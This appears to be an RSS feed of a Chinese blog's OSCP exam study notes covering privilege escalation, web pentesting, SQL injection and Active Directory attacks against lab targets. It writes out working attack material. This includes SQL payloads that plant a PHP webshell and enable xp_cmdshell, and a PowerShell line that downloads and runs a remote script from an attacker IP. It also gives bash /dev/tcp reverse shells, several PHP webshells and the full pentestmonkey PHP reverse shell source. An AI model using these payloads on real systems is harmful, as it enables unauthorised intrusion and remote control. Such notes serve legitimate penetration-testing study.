<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>OSCP笔记 on 养猪日记</title>
    <link>https://yangzhuzai.github.io/categories/oscp%E7%AC%94%E8%AE%B0/</link>
    <description>Recent content in OSCP笔记 on 养猪日记</description>
    <image>
      <title>养猪日记</title>
      <url>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.135.0</generator>
    <language>en</language>
    <lastBuildDate>Fri, 11 Oct 2024 14:25:59 +0800</lastBuildDate>
    <atom:link href="https://yangzhuzai.github.io/categories/oscp%E7%AC%94%E8%AE%B0/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>kali 环境爬坑</title>
      <link>https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/kali-%E7%8E%AF%E5%A2%83%E7%88%AC%E5%9D%91/</guid>
      <description>&lt;p&gt;python2 安装pip问题：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py
python2 -m pip install --upgrade setuptools -i https://pypi.tuna.tsinghua.edu.cn/simple
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;pip2 安装impacket:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python2 -m pip install impacket==0.9.22
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;kali安装bloodhound&#34;&gt;kali安装bloodhound&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install neo4j
sudo neo4j console
控制台默认账密：neo4j
配置好后，安装bloodhound
sudo apt-get install bloodhound
输入修改后的密码

ps1脚本使用：
Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;kali-使用impacket--docker&#34;&gt;kali 使用impacket&amp;ndash;docker&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;安装docker
apt-get install docker.io
systemctl start docker

下载相关文件夹：
构建 Impacket 的镜像：
docker build -t &amp;#34;impacket:latest&amp;#34; .
使用 Impacket 的镜像：
docker run -it --rm &amp;#34;impacket:latest&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;安装impacket--推荐此方式&#34;&gt;安装impacket&amp;ndash;推荐此方式&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/CoreSecurity/impacket.git 
cd impacket/ 
python3 -m pip install . 
sudo python3 setup.py install
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;no-module-named-crypto&#34;&gt;No module named &amp;ldquo;Crypto&amp;rdquo;&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;解决方案：
pip install pycryptodome
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;openvpn-over-socsk5&#34;&gt;openvpn over socsk5&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;socks-proxy 192.168.5.2 7890
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;etcsambasmbconf-配置&#34;&gt;/etc/samba/smb.conf 配置&lt;/h1&gt;
&lt;p&gt;注释：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linux 提权</title>
      <link>https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/linux-%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;p&gt;添加路由：
sudo route add -net 192.168.245.1 netmask 255.255.255.0 gw 192.168.45.254
sudo route add -net &amp;lt;目标网络&amp;gt; netmask &amp;lt;掩码&amp;gt; gw &amp;lt;网关地址&amp;gt;&lt;/p&gt;
&lt;p&gt;有gcc先考虑内核提权，存在少量情况是没有GCC，交叉编译；&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;chmod u+s /bin/bash
/bin/bash -p 
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;提权手动千万注意细节文件计划任务特殊进程&#34;&gt;提权手动，千万注意细节，文件、计划任务特殊、进程&lt;/h1&gt;
&lt;p&gt;1、SUID：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
类似效果
/usr/sbin/getcap -r / 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2、交互式shell:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3、/etc/crontab ！！！ 手动检查&lt;/p&gt;
&lt;p&gt;ls -lah /etc/cron*&lt;/p&gt;
&lt;p&gt;重点看&lt;strong&gt;小时&lt;/strong&gt;和&lt;strong&gt;cron.d&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;4、sudo -l&lt;/p&gt;
&lt;p&gt;5、数据库账密信息&lt;/p&gt;
&lt;p&gt;6、家目录文件&lt;/p&gt;
&lt;p&gt;7、文件可写：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/etc/passwd
/etc/shadow
/etc/sudoers
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;8、内核信息：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;uname -a    ##打印所有可用的系统信息
uname -r    ##内核版本
uname -n    ##系统主机名。
uname -m    ##查看系统内核架构（64位/32位）
hostname    ##系统主机名
cat /proc/version    ##内核信息
cat /etc/*-release   ##分发信息
cat /etc/issue       ##分发信息
cat /proc/cpuinfo    ##CPU信息
cat /etc/lsb-release   ##Debian 
cat /etc/redhat-release  ##Redhat
ls /boot | grep vmlinuz-


常用方法：
1、确认内核版本：
cat /etc/issue 发行版
uname -r 内核
arch 架构

2、筛选：
searchsploit &amp;#34;linux kernel Ubuntu 16 Local Privilege Escalation&amp;#34;   | grep  &amp;#34;4.&amp;#34; | grep -v &amp;#34; &amp;lt; 4.4.0&amp;#34; | grep -v &amp;#34;4.8&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;9、.bashrc&lt;/p&gt;</description>
    </item>
    <item>
      <title>web渗透</title>
      <link>https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/web%E6%B8%97%E9%80%8F/</guid>
      <description>&lt;p&gt;靶场的关注重点相比实战会更为细节：&lt;/p&gt;
&lt;p&gt;1、域名；
2、网站技术架构cms等；
3、目录；
4、弱口令或者默认口令，弱密码不多，但是需要组合，注意用户名大小写，密码名字复用
5、敏感组合拳信息；
6、web漏洞；&lt;/p&gt;
&lt;h1 id=&#34;fuzz&#34;&gt;FUZZ&lt;/h1&gt;
&lt;p&gt;host域名碰撞&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ffuf -u &amp;#34;http://flight.htb&amp;#34; -H &amp;#34;Host: FUZZ.flight.htb&amp;#34; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;wfuzz&#34;&gt;WFUZZ:&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo wfuzz -w /usr/share/wordlists/wfuzz/general/common.txt -u http://sudocuong.com/workinginprogress.php?FUZZ=id --hw=0(看说明)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;子域名爆破&#34;&gt;子域名爆破&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u streetfighterclub.htb -H &amp;#34;Host: FUZZ.streetfighterclub.htb&amp;#34; --hw 717   
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;目录扫描&#34;&gt;目录扫描：&lt;/h2&gt;
&lt;p&gt;正常扫描，如果没有东西，又没有其他入口，考虑加大字典、换工具、以及二级目录，各种状态码都有值得一看的必要：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.5.104/ -x php,aspx,jsp,html,js

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.63/ -m HEAD -t 100 --no-error -x php,aspx,jsp,html,js

dirsearch -u  http://192.168.154.129/ 

漏洞字典：
/usr/share/wordlists/dirb/vulns/sharepoint.txt


oscp优化：
dirsearch -u http://192.168.192.141/ --wordlists=/usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt 

这个效果一般
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.192.141/ -x php,txt -x php,js,html -m HEAD -t 50

最后版本：
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.225.153:8000/partner/ -t 1000 --no-error -b 404,503
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;http爆破&#34;&gt;http爆破：&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;表单：
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &amp;#34;/department/login.php:username=^USER^password=^PASS^:F=Invalid&amp;#34; -t 64

hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form &amp;#34;/index.php:fm_usr=user&amp;amp;fm_pwd=^PASS^:Login failed. Invalid&amp;#34;


摘要认证：
hydra -L 1.txt -P 1.txt 192.168.154.131 http-get /webdav
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;sql注入&#34;&gt;sql注入：&lt;/h1&gt;
&lt;h2 id=&#34;mysql&#34;&gt;mysql&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;连接：
mysql -h10.0.0.1 -uroot -p123
mysql -u school -p&amp;#39;@jCma4s8ZM&amp;lt;?kA&amp;#39; -h localhost

基础语法：
查库名：
union select group_concat(database())#
查表名：
union select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;library&amp;#39;#
查列名：
union select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;access&amp;#39; #
查数据：
union select group_concat(&amp;#39;\n&amp;#39;,id,&amp;#39;\n&amp;#39;,service,&amp;#39;\n&amp;#39;,username,&amp;#39;\n&amp;#39;,password) from access #
写入：
1&amp;#34;UNION SELECT 1,2,&amp;#34;&amp;lt;?php system($_REQUEST[&amp;#39;a&amp;#39;]);?&amp;gt;&amp;#34; into outfile &amp;#39;C:/inetpub/wwwroot/cxk5.php&amp;#39;#

手动测试流程：
判断是否有注入：
1&amp;#39;-- -
1&amp;#34;-- -
&amp;#39; or 1=1 -- -
判断列数：
-1&amp;#39; order by 1-- -
-1&amp;#39; union select 1,2,3,4,5-- -

mysql爆数据：
group_concat(schema_name) from information_schema.schemata --+  查询库名
group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;webapphacking&amp;#39; --+  查询表名
group_concat(column_name) from information_schema.columns where table_name=&amp;#39;表名&amp;#39; --+ 查询列名
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;mssql&#34;&gt;mssql&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mssql爆数据：
https://www.cnblogs.com/-meditation-/articles/16112699.html
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
值得注意的知识点：
sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。
syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。

如果你想在当前数据库上下文中查询名为 Hub_DB的数据库中的表名，你可以使用 Hub_DB..sysobjects 的语法来引用 Hub_DB 数据库中的系统表 sysobjects。这样的查询将会返回 Hub_DB 数据库中所有对象的信息，包括表、视图、存储过程等。
Hub_DB..syscolumns同理

表名很多参考id值，爆表名时记得把ID也爆出来

关键词：Warning
Query

普通盲注：
&amp;#39; AND IF (1=1, sleep(3),&amp;#39;false&amp;#39;) --
&amp;#39; OR NOT 1251=1251#
&amp;#39; AND IF (1=1, sleep(3),&amp;#39;false&amp;#39;) -- 

简化xp_cmd:
一条：
EXEC sp_configure &amp;#39;show advanced options&amp;#39;,1;RECONFIGURE;EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;,1;RECONFIGURE;
二条
EXEC master.dbo.xp_cmdshell &amp;#39;ping 192.168.45.240&amp;#39;;

盲注开启xp_cmd:

curl members.streetfighterclub.htb/old/verify.asp -d 

&amp;#34;username=test&amp;amp;password=test&amp;amp;logintype=64738;EXEC+sp_configure+&amp;#39;show+advanced+options&amp;#39;,1;EXEC+sp_configure+&amp;#39;Xp_cmdshell&amp;#39;,1;RECONFIGURE;+--&amp;#39;;&amp;amp;B1=LogIn&amp;#34;

关闭xp_cmd:
curl members.streetfighterclub.htb/old/verify.asp -d &amp;#34;username=test&amp;amp;password=test&amp;amp;logintype=64738;EXEC+sp_configure+&amp;#39;show+advanced+options&amp;#39;,1;EXEC+sp_configure+&amp;#39;Xp_cmdshell&amp;#39;,0;RECONFIGURE;+--&amp;#39;;&amp;amp;B1=LogIn&amp;#34;

验证：
sudo tcpdump -nni tun0 icmp
username=a&amp;amp;password=a&amp;amp;logintype=1;EXEC+Xp_cmdshell+&amp;#39;ping+10.10.16.5&amp;#39;;&amp;amp;B1=LogIn

反弹shell:
EXEC master.dbo.xp_cmdshell &amp;#34;powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString(&amp;#39;http://192.168.45.175/nishang.ps1&amp;#39;)&amp;#34;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;xp_cmd命令执行16进制编码，不一定成功&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows 提权</title>
      <link>https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/windows-%E6%8F%90%E6%9D%83/</guid>
      <description>&lt;p&gt;提权检查项目：注意细心！！！！！！！！！！一切异常情况&lt;/p&gt;
&lt;p&gt;目前实验发现，备份文件、历史记录、内存密码、特殊程序都有可能，然后是密码复用，administrator&lt;/p&gt;
&lt;p&gt;1、计划任务，配合手动可以查看下次运行时间
2、服务，查看是否具备重启服务或者自动运行重启计算机的权限
3、DLL劫持去看软件目录日志吧
4、不可相信命令查看的软件列表，需要手动慢慢看
5、注意WINPEASS的输出，可能存在明文的密码
6、内核提权不多，重点在于特权提权
7、一些特殊的软件或者目录，keepass2\putty\&lt;/p&gt;
&lt;h1 id=&#34;信息收集&#34;&gt;信息收集&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;start /b 程序  后台运行
cmd /k start 后台运行
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看管理员用户组：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;本地
net localgroup administrators

获取所有组
net localgroup
Get-LocalGroup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用户添加：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net group site_admin awallace /add /domain

进阶操作：
net user cxk cxk123! /add /domain   添加用户进域
net group 组名 用户名 /add 添加用户到组
net localgroup &amp;#34;Remote Management Users&amp;#34; cxk /add  添加到远程管理组
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看当前用户所属组：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;whoami /groups
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过注册表查看已经安装了的软件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;64位：
Get-ItemProperty &amp;#34;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&amp;#34; | select displayname

32位：
Get-ItemProperty &amp;#34;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&amp;#34; | select displayname
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过目录查看安装软件情况：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;C:\Program Files (x86)
C:\Program Files
\AppData\Roaming\

C:\Users\cxk\AppData\Roaming
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正在运行的进程：&lt;/p&gt;</description>
    </item>
    <item>
      <title>反弹shell</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%8F%8D%E5%BC%B9shell/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block&#34;&gt;https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet?trk=article-ssr-frontend-pulse_little-text-block&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;php&#34;&gt;PHP:&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1、webshell代码：
&amp;lt;?php system($_REQUEST[&amp;#39;a&amp;#39;]);?&amp;gt;
使用方式：
?a=id

&amp;lt;?php system($_GET[&amp;#39;a&amp;#39;]);?&amp;gt;
使用方式：
&amp;amp;a=id

&amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;

如果有拦截，可以尝试以下代码：
&amp;lt;?=`$_GET[0]`?&amp;gt;

2、反弹shell代码：
&amp;lt;?php exec(&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.254.128/8888 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34;); ?&amp;gt;
                bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.45.205/4444 0&amp;gt;&amp;amp;1&amp;#34;

3、php代码

  &amp;lt;?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = &amp;#34;1.0&amp;#34;;
  $ip = &amp;#39;10.10.16.12&amp;#39;;  // You have changed this
  $port = 8888;  // And this
  $chunk_size = 1400;
  $write_a = null;
  $error_a = null;
  $shell = &amp;#39;uname -a; w; id; /bin/sh -i&amp;#39;;
  $daemon = 0;
  $debug = 0;

  //
  // Daemonise ourself if possible to avoid zombies later
  //

  // pcntl_fork is hardly ever available, but will allow us to daemonise
  // our php process and avoid zombies.  Worth a try...
  if (function_exists(&amp;#39;pcntl_fork&amp;#39;)) {
    // Fork and have the parent process exit
    $pid = pcntl_fork();
    
    if ($pid == -1) {
      printit(&amp;#34;ERROR: Can&amp;#39;t fork&amp;#34;);
      exit(1);
    }
    
    if ($pid) {
      exit(0);  // Parent exits
    }

    // Make the current process a session leader
    // Will only succeed if we forked
    if (posix_setsid() == -1) {
      printit(&amp;#34;Error: Can&amp;#39;t setsid()&amp;#34;);
      exit(1);
    }

    $daemon = 1;
  } else {
    printit(&amp;#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&amp;#34;);
  }

  // Change to a safe directory
  chdir(&amp;#34;/&amp;#34;);

  // Remove any umask we inherited
  umask(0);

  //
  // Do the reverse shell...
  //

  // Open reverse connection
  $sock = fsockopen($ip, $port, $errno, $errstr, 30);
  if (!$sock) {
    printit(&amp;#34;$errstr ($errno)&amp;#34;);
    exit(1);
  }

  // Spawn shell process
  $descriptorspec = array(
    0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;),  // stdin is a pipe that the child will read from
    1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;),  // stdout is a pipe that the child will write to
    2 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;)   // stderr is a pipe that the child will write to
  );

  $process = proc_open($shell, $descriptorspec, $pipes);

  if (!is_resource($process)) {
    printit(&amp;#34;ERROR: Can&amp;#39;t spawn shell&amp;#34;);
    exit(1);
  }

  // Set everything to non-blocking
  // Reason: Occsionally reads will block, even though stream_select tells us they won&amp;#39;t
  stream_set_blocking($pipes[0], 0);
  stream_set_blocking($pipes[1], 0);
  stream_set_blocking($pipes[2], 0);
  stream_set_blocking($sock, 0);

  printit(&amp;#34;Successfully opened reverse shell to $ip:$port&amp;#34;);

  while (1) {
    // Check for end of TCP connection
    if (feof($sock)) {
      printit(&amp;#34;ERROR: Shell connection terminated&amp;#34;);
      break;
    }

    // Check for end of STDOUT
    if (feof($pipes[1])) {
      printit(&amp;#34;ERROR: Shell process terminated&amp;#34;);
      break;
    }

    // Wait until a command is end down $sock, or some
    // command output is available on STDOUT or STDERR
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // If we can read from the TCP socket, send
    // data to process&amp;#39;s STDIN
    if (in_array($sock, $read_a)) {
      if ($debug) printit(&amp;#34;SOCK READ&amp;#34;);
      $input = fread($sock, $chunk_size);
      if ($debug) printit(&amp;#34;SOCK: $input&amp;#34;);
      fwrite($pipes[0], $input);
    }

    // If we can read from the process&amp;#39;s STDOUT
    // send data down tcp connection
    if (in_array($pipes[1], $read_a)) {
      if ($debug) printit(&amp;#34;STDOUT READ&amp;#34;);
      $input = fread($pipes[1], $chunk_size);
      if ($debug) printit(&amp;#34;STDOUT: $input&amp;#34;);
      fwrite($sock, $input);
    }

    // If we can read from the process&amp;#39;s STDERR
    // send data down tcp connection
    if (in_array($pipes[2], $read_a)) {
      if ($debug) printit(&amp;#34;STDERR READ&amp;#34;);
      $input = fread($pipes[2], $chunk_size);
      if ($debug) printit(&amp;#34;STDERR: $input&amp;#34;);
      fwrite($sock, $input);
    }
  }

  fclose($sock);
  fclose($pipes[0]);
  fclose($pipes[1]);
  fclose($pipes[2]);
  proc_close($process);

  // Like print, but does nothing if we&amp;#39;ve daemonised ourself
  // (I can&amp;#39;t figure out how to redirect STDOUT like a proper daemon)
  function printit ($string) {
    if (!$daemon) {
      print &amp;#34;$string
&amp;#34;;
    }
  }

  ?&amp;gt; 

4、命令执行

&amp;lt;?php system(&amp;#34;whoami&amp;#34;);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;本地自带的phpwebshell:&lt;/p&gt;</description>
    </item>
    <item>
      <title>另类技巧</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7/</guid>
      <description>&lt;p&gt;wget 批量下载文件：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#!/bin/bash

# 设置起始和结束日期
start_date=&amp;#34;2020-01-01&amp;#34;
end_date=&amp;#34;2020-01-31&amp;#34;

# 初始化当前日期为起始日期
current_date=&amp;#34;$start_date&amp;#34;

# 循环，直到当前日期等于当前系统日期
while [ $current_date != $(end_date) ]; do
    # 构建下载链接
    url=&amp;#34;http://10.10.10.248/Documents/$current_date-upload.pdf&amp;#34;
    
    # 输出正在下载的链接
    echo &amp;#34;Downloading $url&amp;#34;
    
    # 使用 wget 下载文件
    wget &amp;#34;$url&amp;#34;
    
    # 递增日期
    current_date=$(date -I -d &amp;#34;$current_date + 1 day&amp;#34;)
done
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;批量读取文件创建者信息：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq &amp;gt; userlist
exiftool *.jpg | grep -i Author | cut -d &amp;#34;:&amp;#34; -f 2 | cut -d &amp;#34; &amp;#34; -f 2,3 &amp;gt; authors
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将所有pdf文件转换成txt文件：&lt;/p&gt;</description>
    </item>
    <item>
      <title>域渗透思路总结</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;h1 id=&#34;一获取立足身份凭证&#34;&gt;一、获取立足身份凭证&lt;/h1&gt;
&lt;h2 id=&#34;1ldap匿名信息泄露&#34;&gt;1、LDAP匿名信息泄露：&lt;/h2&gt;
&lt;p&gt;配合windapsearch.py获取域内用户信息：&lt;/p&gt;
&lt;p&gt;① 可能存在密码泄露；&lt;/p&gt;
&lt;p&gt;② 可获取用户名，配合AS-REP Roasting破解；&lt;/p&gt;
&lt;p&gt;③ 密码喷洒，记得使用可获取密码策略，可使用crackmapexec爆破smb协议，不直接爆破kerberos&lt;/p&gt;
&lt;h2 id=&#34;2smbhttpldap信息收集&#34;&gt;2、SMB+HTTP+LDAP信息收集&lt;/h2&gt;
&lt;p&gt;① SMB注意共享目录，如果存在当前身份无法访问的目标，大概率是要切换身份，目前推荐使用工具为impacket的smbclient.py，网上下载的即可&lt;/p&gt;
&lt;p&gt;② HTTP目前遇到直接getshell的少，但是SQL注入、文件包含的多，甚至需要代码审计&lt;/p&gt;
&lt;p&gt;③ 信息收集方面，注意姓+名的用户名生成方式，收集员工、组织、邮箱等方式，LDAP匿名和有身份的情况下查找的信息可能存在不一样（名字组合：首字母姓+名、姓.名、姓_名、姓首字母.名字）&lt;/p&gt;
&lt;p&gt;④ NTLM relay的攻击不在少数，如打印机、sqlserver等情况可以考虑操作&lt;/p&gt;
&lt;h1 id=&#34;二提权思路&#34;&gt;二、提权思路&lt;/h1&gt;
&lt;p&gt;以下方式一般为优先级按个执行&lt;/p&gt;
&lt;h2 id=&#34;1bloodhound&#34;&gt;1、Bloodhound&lt;/h2&gt;
&lt;p&gt;bloodhound基本能识别大部分默认的权限组织和权限滥用的提权，如：委派、DCSync、组织、ACL滥用、一些特殊组等，如果没有直接的提权方式，基本也是可以梳理一下思路的。&lt;/p&gt;
&lt;h2 id=&#34;2winpeass&#34;&gt;2、winpeass&lt;/h2&gt;
&lt;p&gt;winpeass说实话，直接帮忙提权的点在域内很少，但是它可以帮忙提取很多信息，比如GPP组策略、一些配置信息等，如果当真有直接提权点，那也相当好了。&lt;/p&gt;
&lt;p&gt;具体提权漏洞，见windows操作[[windows提权]]&lt;/p&gt;
&lt;h2 id=&#34;3组信息&#34;&gt;3、组信息&lt;/h2&gt;
&lt;p&gt;查看当前用户是否存在一些不太常见的组信息，比如：LDAP_Readers、ReadGMSAPassword等&lt;/p&gt;
&lt;h2 id=&#34;4密码获取&#34;&gt;4、密码获取&lt;/h2&gt;
&lt;p&gt;当前主机的软件密码，使用LaZagne即可，可能存在不匹配，建议多尝试。&lt;/p&gt;
&lt;h2 id=&#34;5kerberoasting&#34;&gt;5、kerberoasting&lt;/h2&gt;
&lt;p&gt;我认为在进行信息收集后就可以尝试，因为该攻击的操作算作比较简单&lt;/p&gt;
&lt;h2 id=&#34;6adcs证书攻击&#34;&gt;6、ADCS证书攻击&lt;/h2&gt;
&lt;p&gt;在目标主机开放80和https的情况下，很有可能存在证书攻击，CVE-2022-26923、CVE-2021-42287、错误的ADCS模板&lt;/p&gt;
&lt;h2 id=&#34;7白银票据&#34;&gt;7、白银票据&lt;/h2&gt;
&lt;p&gt;如果在一些特殊情况下，可以获得服务账户密码的情况下可以尝试登录服务，如sqlserver，使用pip 安装的mssqlclient甚至可以执行命令&lt;/p&gt;
&lt;h2 id=&#34;8域内漏洞&#34;&gt;8、域内漏洞&lt;/h2&gt;
&lt;p&gt;我认为该方式一般为没有方法的情况下进行尝试，因为这种方式没有明显特征：&lt;/p&gt;
&lt;p&gt;① MS14-068&lt;/p&gt;
&lt;p&gt;② Netlogon&lt;/p&gt;</description>
    </item>
    <item>
      <title>域渗透操作</title>
      <link>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/oscp/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%93%8D%E4%BD%9C/</guid>
